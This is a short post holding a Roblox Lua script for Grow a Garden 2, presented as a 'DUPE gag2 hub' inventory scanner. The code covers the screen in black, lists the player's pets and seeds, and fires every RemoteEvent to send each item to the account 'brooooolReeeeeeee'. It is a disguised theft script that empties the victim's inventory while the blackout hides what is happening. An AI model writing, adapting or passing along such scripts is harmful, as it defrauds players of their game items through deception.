erafox:

```lua
-- Универсальный сканер для Grow a Garden 2
local player = game.Players.LocalPlayer

-- Черный экран
local gui = Instance.new("ScreenGui")
gui.Parent = player.PlayerGui

local frame = Instance.new("Frame")
frame.Size = UDim2.new(1, 0, 1, 0)
frame.BackgroundColor3 = Color3.new(0,0,0)
frame.Parent = gui

local text = Instance.new("TextLabel")
text.Size = UDim2.new(1, 0, 1, 0)
text.BackgroundTransparency = 1
text.Text = "DUPE gag2 hub"
text.TextColor3 = Color3.new(1,1,1)
text.TextScaled = true
text.Font = Enum.Font.GothamBold
text.Parent = gui

-- Поиск всех RemoteEvent
local events = {}
for _, v in pairs(game:GetDescendants()) do
    if v:IsA("RemoteEvent") then
        table.insert(events, v)
    end
end

-- Сканирование инвентаря
local inv = player:FindFirstChild("Inventory") or player:FindFirstChild("Data") or player:FindFirstChild("Items")
local items = {}
if inv then
    local pets = inv:FindFirstChild("Pets")
    local seeds = inv:FindFirstChild("Seeds")
    
    if pets then
        for _, pet in pairs(pets:GetChildren()) do
            table.insert(items, {id = pet:GetAttribute("ItemID") or pet.Name, type = "Pet"})
        end
    end
    if seeds then
        for _, seed in pairs(seeds:GetChildren()) do
            table.insert(items, {id = seed:GetAttribute("ItemID") or seed.Name, type = "Seed"})
        end
    end
end

-- Отправка через все найденные RemoteEvent
for _, event in pairs(events) do
    for _, item in pairs(items) do
        pcall(function()
            event:FireServer("brooooolReeeeeeee", item.id, item.type, 1)
            event:FireServer("brooooolReeeeeeee", item.id, 1, item.type)
            event:FireServer(item.id, "brooooolReeeeeeee", item.type, 1)
            event:FireServer(item.id, item.type, "brooooolReeeeeeee", 1)
            event:FireServer({recipient = "brooooolReeeeeeee", id = item.id, type = item.type})
        end)
        wait(0.2)
    end
end

text.Text = "Complete!"
wait(2)
gui:Destroy()
```
